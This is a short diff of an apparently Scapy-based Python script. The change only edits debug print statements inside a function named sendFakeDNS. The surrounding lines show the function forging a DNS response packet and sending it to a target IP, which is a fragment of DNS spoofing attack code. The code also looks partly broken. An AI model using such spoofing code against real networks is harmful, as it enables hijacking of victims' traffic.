@@ -16,8 +16,7 @@ def StopDNS(fmf):
     print(fmf)
 
 def sendFakeDNS(pkt):
-    print(pkt.IP.dst)
-    print(pkt.IP.gateway)
+    print(pkt)
     if pkt.IP.dst != pkt.IP.gateway : 
         dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qr=1, qd=DNSRR(rrname="61.13.148.37"))
         send(dnsResPacket)
